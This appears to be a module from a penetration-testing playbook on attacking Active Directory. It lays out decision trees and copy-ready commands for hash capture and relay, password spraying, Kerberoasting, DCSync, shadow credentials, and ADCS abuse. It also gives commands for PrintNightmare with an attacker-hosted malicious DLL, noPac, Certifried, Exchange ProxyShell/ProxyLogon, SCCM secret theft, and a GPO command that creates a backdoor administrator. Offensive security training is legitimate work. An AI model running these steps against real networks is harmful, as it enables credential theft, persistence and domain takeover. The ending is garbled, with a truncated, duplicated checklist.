# Module 11: Active Directory Enumeration & Attacks

> **Credential handling decisions → `../operator/CREDENTIAL_DECISION_TREE.md`**
> This module covers AD-specific attacks. For generic credential testing (PTH, sweep, spray), use the decision tree.

## When to Use This Module
Use this module when you are on a domain-joined system (or have domain credentials) and need to compromise the Active Directory environment. This module covers the full AD attack chain from initial enumeration through domain dominance.

## Prerequisites
- Domain-joined system OR domain credentials
- Network connectivity to domain controllers
- Tools: BloodHound, Impacket, Responder, ldapdomaindump

## Entry Check

```
Domain identified during scanning or host compromise?
├── Have domain credentials?
│   ├── Yes → Start credentialed enumeration
│   │   ├── BloodHound → Find attack paths
│   │   ├── ldapdomaindump → Dump AD structure
│   │   └── netexec → Enumerate domain hosts
│   └── No → Start unauthenticated enumeration
│       ├── Check for SMB null sessions
│       ├── Check LDAP anonymous bind
│       ├── Run Responder for hash capture
│       └── Enumerate users via Kerbrute
├── Have SYSTEM/root on a domain-joined host?
│   ├── Dump LSASS for domain creds
│   └── Enumerate domain from host context
└── Nothing? → See password attacks (Module 06) for cracking/spraying
```

## AD Enumeration

```
Domain accessible?
├── Users
│   ├── net users /domain
│   ├── BloodHound: list all domain users
│   └── kerbrute userenum -d domain.local users.txt
├── Groups
│   ├── net group /domain
│   ├── net group "Domain Admins" /domain
│   ├── net group "Enterprise Admins" /domain
│   └── BloodHound: identify high-value groups
├── Computers
│   ├── netexec smb target --users
│   └── AD: computers with unconstrained delegation
├── Service accounts (SPNs)
│   ├── setspn -T domain -Q */*
│   └── Impacket: GetUserSPNs
├── Domain trusts
│   ├── nltest /domain_trusts
│   └── BloodHound: identify trust relationships
└── ACLs / permissions
    └── BloodHound: identify interesting ACEs
```

## AD Attack Chain Decision Tree

```
AD attack flow (execute in this priority order):

1. RESPONDER / LLMNR/NBT-NS Poisoning
├── Run: sudo responder -I eth0 -wrfv
├── Captures NetNTLMv2 hashes  
│   └── Crack with hashcat -m 5600 → cleartext password
└── SMB signing disabled on any host?
    └── ntlmrelayx.py → Relay to other services

2. PASSWORD SPRAYING (if you have usernames)
├── Determine password policy first (if possible)
├── netexec smb target -u users.txt -p 'Password1'
├── Always try: <Season><Year>!, <CompanyName>1, Welcome1
└── Success → Move to BloodHound enumeration

3. AS-REP Roasting (no pre-auth required)
├── Impacket: GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
├── If user found → Crack with hashcat -m 18200
└── Success → Cleartext password for that user

4. KERBEROASTING (SPNs exist)
├── Impacket: GetUserSPNs.py domain.local/user:pass -request
├── If TGS tickets obtained → Crack with hashcat -m 13100
└── Success → Service account cleartext password

5. BloodHound Analysis
├── Linux: bloodhound-python -u user -p pass -d domain.local -ns <DC>
├── Windows (on target): SharpHound.exe -c All
├── Load data into BloodHound GUI
├── Check for:
│   ├── DA session on compromised host → Cred theft
│   ├── GenericAll/GenericWrite over high-value objects
│   ├── AdminTo relationship → Lateral movement
│   ├── DCSync rights on any account
│   ├── ForceChangePassword on privileged users
│   ├── AllExtendedRights over interesting objects
│   └── Group membership: Help Desk, Server Operators, etc.
└── Follow discovered paths to DA

6. ACL-BASED ATTACKS
├── ForceChangePassword? → net user target pass /domain
├── GenericAll on group? → Add user to group
├── WriteOwner? → Change owner, then modify
├── WriteDACL? → Grant yourself DCSync
└── AllExtendedRights? → DCSync

7. DELEGATION-BASED ATTACKS
├── Unconstrained delegation found?
│   ├── Compromise the host
│   ├── Wait for DA to connect → Steal TGT
│   └── Pass-the-Ticket → DA access
├── Constrained delegation found?
│   └── Impacket: getST.py → impersonate DA
└── Resource-based constrained delegation (RBCD)?
    └── Set msDS-AllowedToActOnBehalfOfOtherIdentity

8. ADCS (Active Directory Certificate Services)
├── ESC1: Low-priv user can enroll + SAN specified
│   └── certipy find -u user@domain -p pass -dc-ip <DC>
├── ESC3: Certificate Request Agent abuse
├── ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
├── ESC8: NTLM relay to ADCS Web enrollment
│   ├── ⚠ PREREQUISITE: Web Enrollment must be enabled on the CA
│   │   └── Check: curl http://DC/certsrv/ (returns page = web enrollment enabled)
│   │   └── If 404/connection refused → Web enrollment NOT enabled, ESC8 won't work
│   └── ntlmrelayx.py -t http://DC/certsrv -smb2support -adcs
└── ESC9/ESC10: No security extension + user can enroll

9. SHADOW CREDENTIALS (msDS-KeyCredentialLink)
├── When to check: You have GenericAll, GenericWrite, or WriteOwner on any user or computer object (visible in BloodHound)
├── BloodHound indicators:
│   ├── Edge: `GenericAll` on a user/computer → can add key credential
│   ├── Edge: `GenericWrite` on a user/computer → can add key credential
│   ├── Edge: `WriteOwner` → change owner, then add key credential
│   └── Pre-built query: "Shadow Credentials" in BloodHound CE / Cypher
├── Required permissions: `GenericAll`, `GenericWrite`, `WriteOwner`, or `AllExtendedRights` on the target object
├── Attack workflow:
│   ├── certipy shadow auto -u user@DOMAIN -p pass -dc-ip DC -account TARGET$
│   │   └── Discovers, adds key credential, requests cert, and authenticates
│   ├── Manual: certipy shadow add -u user@DOMAIN -p pass -dc-ip DC -account TARGET$
│   │   └── Then: certipy auth -pfx TARGET.pfx -dc-ip DC -username TARGET$ -domain DOMAIN
│   └── Target can be: user, computer, or service account
├── Validation: Does the target object exist and is your principal listed with the right ACE?
│   └── BloodHound confirms this — if it shows GenericAll/GenericWrite, the path exists
├── Follow-on opportunities:
│   ├── If target is a domain controller computer account → DCSync
│   ├── If target is a privileged user → impersonate that user → AD attack chain
│   ├── If target is a service account → Kerberoast-alternative credential access
│   └── Certificate persists even if target password changes → persistence vector
└── If this fails:
    ├── Confirm the ACE actually exists (BloodHound may have stale data)
    ├── Try a different target — any writable object in the path to DA
    └── Check if the target already has msDS-KeyCredentialLink populated (can't add twice)

10. DOMAIN TRUST ATTACKS
├── Child → Parent trust?
│   ├── Obtain child domain KRBTGT hash
│   ├── Extra SID: Enterprise Admins SID (parent domain SID-519)
│   └── Impacket: ticketer.py → Golden Ticket with extra SID
├── Inbound trust?
│   └── SID filtering disabled? → SID history abuse
└── Cross-forest trust?
    └── Kerberoast across trust (if configured)

11. DCSYNC (domain dominance)
├── Requirements: Replicating Directory Changes (DS-Replication-Get-Changes)
├── Who has these rights?
│   ├── Domain Admins
│   ├── Enterprise Admins
│   └── Any account with DCSync rights (from BloodHound)
├── Impacket: secretsdump.py domain/DA_user:pass@DC
│   └── Dumps: KRBTGT hash → Golden Ticket; All NTLM hashes
└── If you don't have DA → Find path via BloodHound

12. GPO ABUSE (Group Policy Objects)
├── When to check: You have GenericAll/GenericWrite/WriteDacl on a GPO (visible in BloodHound)
├── BloodHound edge: `GPOAdmin` or ACL on GPO object
├── Attack workflow:
│   ├── Create immediate task via GPO that runs as SYSTEM on all affected hosts
│   ├── python3 pyGPOabuse.py domain/user:pass -gpo-id "{GPO-GUID}" -powershell -command "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"
│   ├── OR: Modify GPO to add scheduled task → pushes to all OU-linked hosts
│   └── gpupdate /force on target (or wait for next refresh cycle ~90 min)
├── Impact: Code execution as SYSTEM on every host the GPO applies to
└── If this fails: Confirm GPO is linked to an OU with computers

13. PRINTNIGHTMARE (CVE-2021-1675 / CVE-2021-34527)
├── When to check: Windows print spooler service enabled (default on DCs)
├── Check if vulnerable: rpcdump.py @target | grep -i print
│   └── If PrintSystemAsPipeline protocol present → likely vulnerable
├── Exploitation:
│   ├── python3 CVE-2021-1675.py domain/user:pass@target '\\attacker\share\evil.dll'
│   ├── OR: SharpPrintNightmare.exe '\\attacker\share\evil.dll' target
│   └── Mimikatz: misc::printnightmare /server:target /library:\\attacker\share\evil.dll
├── Impact: SYSTEM on target (DC = DA)
└── Prerequisite: Attacker must host SMB share with malicious DLL

14. NOPAC (CVE-2021-42278 / CVE-2021-42287)
├── When to check: Domain controller not patched (pre-Dec 2021 patches)
├── Check: netexec smb target -u user -p pass -M noPAC
├── Exploitation:
│   ├── python3 noPac.py domain/user:pass -dc-ip DC -dc-host DC --impersonate Administrator
│   └── Returns a usable service ticket as Administrator
├── Impact: DA from any domain user (if DC is unpatched)
└── If this fails: DC is patched, move to other paths

15. CERTIFRIED (CVE-2022-26923)
├── When to check: ADCS present + domain user credentials
├── Vulnerability: certipy can specify computer object with arbitrary SAN
├── Exploitation:
│   ├── Create computer account: certipy auth -u user@domain -p pass -dc-ip DC
│   ├── Request cert as computer with SAN of DA: certipy req -u 'EVIL$@domain' -p 'Pass123!' -ca 'CA-NAME' -template 'Machine' -dc-ip DC
│   └── certipy auth -pfx da.pfx -dc-ip DC -username Administrator -domain DOMAIN
├── Impact: DA from any domain user (if ADCS allows machine cert enrollment)
└── If this fails: ADCS patched or no Machine template enrollment

16. ADCS ESC11-15 (Additional Certificate Abuse)
├── ESC11: NTLM relay to ICPR (RPC certificate request)
│   ├── Check: certipy find -u user@domain -p pass -dc-ip DC (look for IF_ENFORCEENCRYPTICERTREQUEST)
│   └── Exploit: ntlmrelayx.py -t rpc://DC -rpc-mode ICPR -icpr-ca-name "CA-NAME"
├── ESC12: Shell access to machine with enrolled cert (offline abuse)
├── ESC13: Certificate linked to group via Application Policy → Group escalation
├── ESC14: NTLM relay with spoofed certificate (requires specific CA config)
└── ESC15: PetitPotam relay to ICPR (combined with ESC11)

17. EXCHANGE EXPLOITATION
├── When to check: Exchange server detected (OWA on 443, port 25, or autodiscover)
├── Check for Exchange: netexec smb target -u user -p pass -M enum_exchange
├── ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207):
│   ├── python3 proxyshell.py target -e user@domain (pre-auth RCE)
│   └── Impact: SYSTEM on Exchange server → often DA (Exchange has high privs)
├── ProxyLogon (CVE-2021-26855, CVE-2021-27065):
│   ├── python3 proxylogon.py target user@domain
│   └── Impact: SYSTEM on Exchange server
├── ProxyNotShell (CVE-2022-41040, CVE-2022-41082):
│   └── Similar to ProxyShell, post-auth RCE chain
├── Exchange → DA: Exchange servers typically have DCSync-equivalent rights
│   └── Compromise Exchange = compromise domain (via Exchange Windows Permissions group)
└── Tools: nmap scripts for Exchange version detection, MailSniper for OWA enum

18. SCCM/MECM ABUSE
├── When to check: SCCM detected (ports 8530/8531, SMS_EXECUTIVE service, or PXE)
├── Check: netexec smb target -u user -p pass -M sccm
├── Attack paths:
│   ├── NAA (Network Access Account) credential theft:
│   │   ├── Find NAA creds in DP policy: Get-WmiObject -Namespace root\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
│   │   └── Decrypt from local SCCM client: SharpSCCM.exe local secrets -m
│   ├── Site Server takeover (if admin on SCCM server):
│   │   ├── Add computer as DP → push malicious policy to all clients
│   │   └── SharpSCCM.exe exec -r -s <site_server> -i <client>
│   ├── PXE abuse: Boot from PXE → extract task sequence credentials
│   └── HTTP relay: SCCM management point may accept NTLM relay
├── Impact: Code execution on all SCCM-managed hosts
└── Tools: SharpSCCM, sccmhunter, MalSCCM

19. LAPS v2 (Windows LAPS / Legacy LAPS)
├── LAPS v1 (Legacy): Password stored in ms-Mcs-AdmPwd attribute
│   └── Read: netexec ldap DC -u user -p pass -M laps
├── LAPS v2 (Windows LAPS 2023+): Password stored in msLAPS-Password attribute
│   ├── Read: ldapsearch -x -H ldap://DC -D 'user@domain' -w 'pass' -b 'DC=domain,DC=local' '(msLAPS-Password=*)' msLAPS-Password cn
│   ├── Decode: Base64 decode the msLAPS-Password value (JSON with "p" field = password)
│   └── Check both attributes — environments may use either or both
├── Impact: Local admin password for specific host → LSASS dump → domain creds
└── Always check BOTH ms-Mcs-AdmPwd AND msLAPS-Password attributes
```

## Tool Execution Commands

```bash
# Responder (hash capture)
sudo responder -I eth0 -wrfv

# Relay (with Responder disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support

# AS-REP Roasting
impacket-GetNPUsers -dc-ip <DC> -usersfile users.txt domain.local/

# Kerberoasting
impacket-GetUserSPNs -dc-ip <DC> domain.local/user:pass -request

# BloodHound (Linux)
bloodhound-python -d domain.local -u user -p pass -ns <DC> -c All

# DCSync (requires DA/Enterprise Admin/equivalent)
impacket-secretsdump domain/DA_user:pass@<DC>

# Kerbrute user enumeration
kerbrute userenum -d domain.local --dc <DC> users.txt

# certipy (ADCS enumeration)
certipy find -u user@domain.local -p pass -dc-ip <DC>

# Delegation abuse
impacket-findDelegation domain/user:pass
impacket-getST -spn cifs/target.domain.local domain/user:pass -impersonate administrator

# Shadow Credentials
certipy shadow auto -u user@domain.local -p pass -dc-ip <DC> -account TARGET$
certipy shadow add -u user@domain.local -p pass -dc-ip <DC> -account TARGET$
certipy auth -pfx TARGET.pfx -dc-ip <DC> -username TARGET$ -domain domain.local

# GPO Abuse (requires write access to GPO)
python3 pyGPOabuse.py domain/user:pass -gpo-id "{GPO-GUID}" \
  -powershell -command "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"

# PrintNightmare (CVE-2021-1675/34527)
python3 CVE-2021-1675.py domain/user:pass@target '\\attacker\share\evil.dll'

# NoPac (CVE-2021-42278/42287)
python3 noPac.py domain/user:pass -dc-ip DC -dc-host DC --impersonate Administrator

# Certifried (CVE-2022-26923)
certipy req -u 'EVIL$@domain' -p 'Pass123!' -ca 'CA-NAME' -template 'Machine' -dc-ip DC
certipy auth -pfx da.pfx -dc-ip DC -username Administrator -domain DOMAIN

# ADCS ESC11 (ICPR relay)
ntlmrelayx.py -t rpc://DC -rpc-mode ICPR -icpr-ca-name "CA-NAME"

# Exchange exploitation
python3 proxyshell.py target -e user@domain
python3 proxylogon.py target user@domain

# SCCM abuse
SharpSCCM.exe local secrets -m
SharpSCCM.exe exec -r -s <site_server> -i <client>

# LAPS v2 (Windows LAPS 2023+)
ldapsearch -x -H ldap://DC -D 'user@domain' -w 'pass' -b 'DC=domain,DC=local' \
  '(msLAPS-Password=*)' cn msLAPS-Password
```

## Key Attack Flow Summary

```
Phase 1: Get a user → (Responder / Spray / Kerbrute / AS-REP)
Phase 2: Enumerate → (BloodHound / ldapdomaindump)
Phase 3: Path to DA → (Kerberoast / ACL abuse / Shadow Credentials / Delegation / ADCS)
Phase 4: DCSync → (secretsdump.py)
Phase 5: Golden Ticket → (ticketer.py + pass-the-ticket)
Phase 6: Pivot → (Module 12) or Cleanup → (Module 14)
```

## Cross-References
- For password cracking → [Module 06: Password Attacks](06-password-attacks.md)
- For lateral movement between systems → [Module 12: Lateral Movement & Pivoting](12-lateral-pivot.md)
- For post-exploitation credential harvesting → [Module 13: Post-Exploitation](13-post-exploitation.md)
- For reporting DA compromise → [Module 14: Reporting](14-reporting.md)
- BloodHound cheat sheet → [assets/cheatsheets/bloodhound.md](../assets/cheatsheets/bloodhound.md)

## Output Summary
- [ ] Domain enumerated (users, groups, computers, trusts)
- [ ] BloodHound data collected and analyzed
- [ ] Attack path identified (or verified none exists)
- [ ] AS-REP roasting attempted (if no creds)
- [ ] Kerberoasting attempted (if creds obtained)
- [ ] Password spraying completed (within policy)
- [ ] ACL-based attacks attempted
- [ ] Delegation attacks attempted (incl. RBCD machine quota check)
- [ ] ADCS attack chain attempted (ESC1-15)
- [ ] Shadow Credentials attempted (functional level 2016+ verified)
- [ ] GPO abuse attempted (if write access to GPO)
- [ ] PrintNightmare / NoPac / Certifried checked (if DC unpatched)
- [ ] Exchange exploitation checked (if Exchange present)
- [ ] SCCM abuse checked (if SCCM detected)
- [ ] LAPS v1 AND v2 passwords checked
- [ ] DCSync achieved (or verified not possible)
- [ ] Domain dominance documented
utput Summary
- [ ] Domain enumerated (users, groups, computers, trusts)
- [ ] BloodHound data collected and analyzed
- [ ] Attack path identified (or verified none exists)
- [ ] AS-REP roasting attempted (if no creds)
- [ ] Kerberoasting attempted (if creds obtained)
- [ ] Password spraying completed (within policy)
- [ ] ACL-based attacks attempted
- [ ] Delegation attacks attempted
- [ ] ADCS attack chain attempted
- [ ] DCSync achieved (or verified not possible)
- [ ] Domain dominance documented
